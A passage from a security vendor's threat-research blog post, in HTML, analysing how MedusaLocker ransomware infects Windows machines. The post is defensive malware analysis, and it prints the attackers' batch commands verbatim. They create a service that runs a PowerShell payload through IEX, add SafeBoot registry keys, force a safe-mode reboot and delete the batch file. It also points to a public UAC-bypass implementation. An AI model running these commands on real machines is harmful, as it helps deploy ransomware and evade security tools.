      <h1><span id="hs_cos_wrapper_name" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="text">Cybereason vs. MedusaLocker Ransomware</span></h1>
      <div class="cr-mln__post-author-share">
      <div id="hubspot-author_data" class="hubspot-editable cr-mln__post-meta" data-hubspot-form-id="author_data" data-hubspot-name="Blog Author">

          <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><strong>Research by:</strong> Tom Fakterman and Assaf Dahan</p>
<!--more-->
<h3>Background</h3>
<p>The <a href="https://www.cyber.nj.gov/threat-profiles/ransomware-variants/medusalocker" target="_self">MedusaLocker </a>ransomware first emerged in September 2019, infecting and encrypting Windows machines around the world. There have been reports of MedusaLocker attacks across multiple industries, especially the <a href="https://www.infosecurity-magazine.com/news/hospitals-targeted-ransomware/" target="_self">healthcare industry</a> which suffered a great deal of ransomware attacks during the COVID-19 pandemic.</p>
<p>In order to maximize the chances of successful encryption of the files on the compromised machine, MedusaLocker restarts the machine in safe mode before execution. This method is used to avoid security tools that might not run when the computer starts in safe mode.</p>
<p>MedusaLocker avoids encrypting executable files, most likely to avoid rendering the targeted system unusable for paying the ransom. To make it even more dangerous, MedusaLocker uses a combination of AES and RSA-2048, making the procedure of brute forcing the encryption practically impossible.</p>
<p>Recently, there have been reports stating that AKO, a variant of MedusaLocker, <a href="https://www.crowdstrike.com/blog/double-trouble-ransomware-data-leak-extortion-part-1/" target="_self">added an element of blackmail</a>, threatening to release stolen files publicly. This method of blackmail or extortion is starting to gain popularity in the ransomware market <a href="https://www.cybereason.com/blog/ransomware-weapons-of-mass-disruption" target="_self">as reported by Cybereason</a> earlier this year.</p>
<p>Although data leak extortion threats have been found in some of MedusaLocker’s ransom notes, Cybereason did not observe evidence of information actually being exfiltrated by the MedusaLocker ransomware at the time of this research.</p>
<div class="hs-embed-wrapper" data-service="fast.wistia" data-script-embed="true" data-responsive="true" style="position: relative; overflow: hidden; width: 100%; height: auto; padding: 0px; max-width: 700px; min-width: 256px; display: block; margin: auto; max-height: 393px;"><div class="hs-embed-content-wrapper"><script src="https://fast.wistia.com/embed/medias/1eosld86rs.jsonp" async>&nbsp;</script><script src="https://fast.wistia.com/assets/external/E-v1.js" async></script><div class="wistia_responsive_padding" style="padding:56.25% 0 0 0;position:relative;"><div class="wistia_responsive_wrapper" style="height:100%;left:0;position:absolute;top:0;width:100%;"><span class="wistia_embed wistia_async_1eosld86rs popover=true popoverAnimateThumbnail=true videoFoam=true" style="display:inline-block;height:100%;position:relative;width:100%">&nbsp;</span></div></div></div></div>
<p style="font-size: 16px; text-align: center; line-height: 1.75;"><em>Cybereason Blocks MedusaLocker Ransomware</em></p>
<h3>Key Points</h3>
<p style="padding-left: 40px;"><strong>1. High Severity</strong>: The Cybereason Nocturnus Team assesses the threat level as HIGH given the destructive potential of attack.</p>
<p style="padding-left: 40px;"><strong>2. Encrypting mapped drives: </strong>MedusaLocker encrypts shared network drives of adjacent machines on the network.</p>
<p style="padding-left: 40px;"><strong>3. Attempted extortion: </strong>The ransom note left by new MedusaLocker variants contains threats to publicly reveal stolen data if payments are not made.</p>
<p style="padding-left: 40px;"><strong>4. Detected and Prevented</strong>: Cybereason’s platform fully detects and prevents the MedusaLocker ransomware.</p>
<h3>Breaking Down the Attack</h3>
<p>Many MedusaLocker infections typically start with two files, a ‘batch’ file and a powershell script saved as a ‘txt’ file:</p>
<ul style="font-size: 18px;">
<li>qzy.bat</li>
<li>qzy.txt</li>
</ul>
<h3>Contents of the Batch file</h3>
<p>The qzy.bat file deployed by the attackers is designed to create persistence via a Windows Service. The service does the following tasks:</p>
<p style="padding-left: 40px; line-height: 1.25;"><span style="font-size: 18px;">1. Executes a Powershell script that resides in C:\Windows\SysWOW6\qzy.txt, which contains the Ransomware payload.</span></p>
<p style="padding-left: 40px; line-height: 1.25;"><span style="font-size: 18px;">2. Changes registry keys to allow the service to run in safe mode.</span></p>
<p style="padding-left: 40px; line-height: 1.25;"><span style="font-size: 18px;">3. Enforce restart in safe mode.</span></p>
<p style="padding-left: 40px; line-height: 1.25;"><span style="font-size: 18px;">4. Restart the infected host.</span></p>
<p style="font-size: 18px;">sc create purebackup binpath= "%COMSPEC% /C start /b C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -c $km = [IO.File]::ReadAllText('C:\Windows\SysWOW64\qzy.txt'); IEX $km" start= auto DisplayName= "purebackup"</p>
<p style="line-height: 1;">reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\BackupLP /f</p>
<p style="line-height: 1;">reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\BackupLP /ve /d \"Service\" /f</p>
<p style="line-height: 1;">bcdedit /set {default} safeboot minimal</p>
<p style="line-height: 1;">shutdown /r /f /t 00 &amp; del %0</p>
<p style="line-height: 1;">The batch file execution portrayed in Cybereason attack tree:</p>
<div><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/medusalocker-1.png?width=771&amp;name=medusalocker-1.png" alt="medusalocker-1" width="771" style="width: 771px; display: block; margin: 0px auto;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/medusalocker-1.png?width=386&amp;name=medusalocker-1.png 386w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/medusalocker-1.png?width=771&amp;name=medusalocker-1.png 771w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/medusalocker-1.png?width=1157&amp;name=medusalocker-1.png 1157w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/medusalocker-1.png?width=1542&amp;name=medusalocker-1.png 1542w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/medusalocker-1.png?width=1928&amp;name=medusalocker-1.png 1928w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/medusalocker-1.png?width=2313&amp;name=medusalocker-1.png 2313w" sizes="(max-width: 771px) 100vw, 771px"></div>
<p style="font-size: 16px; text-align: center; line-height: 1.75;"><em>MedusaLocker Batch file execution</em></p>
<p>After the machine is restarted in safe mode, the created service executes and the powershell script runs. This powershell script is a <a href="https://github.com/PowerShellMafia/PowerSploit" target="_self">PowerSploit </a>script known as “<a href="https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/" target="_self">Invoke-ReflectivePEInjection</a>”. The script reflectively loads the MedusaLocker ransomware to the powershell process memory.</p>

<h3>Mutex Detection</h3>
<p>The first thing MedusaLocker does is to check if a process with the mutex “{8761ABBD-7F85-42EE-B272-A76179687C63}” exists on the machine. If the mutex already exists, the ransomware will stop its execution.</p>
<h3>CMSTP UAC BYPASS / Privilege Escalation</h3>
<p>MedusaLocker uses a known <a href="https://attack.mitre.org/techniques/T1191/" target="_self">UAC bypass technique</a> also used by other malware such as <a href="https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware" target="_self">Trickbot</a> that allows the ransomware to run with escalated privileges that enable it to carry out administrative operations. It achieves privilege escalation by leveraging the built-in Windows tool CMSTP.exe to <a href="https://attack.mitre.org/techniques/T1088" target="_self">Bypass User Account Control</a> and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. An implementation of that technique can be found on Github: <a href="https://gist.github.com/hfiref0x/196af729106b780db1c73428b5a5d68d" target="_self" style="background-color: transparent; font-family: Barlow, 'Open Sans', Arial, sans-serif; font-size: 1em;">https://gist.github.com/hfiref0x/196af729106b780db1c73428b5a5d68d</a></p>
<p>An almost identical implementation of the above method was seen used in our analyzed samples:</p>
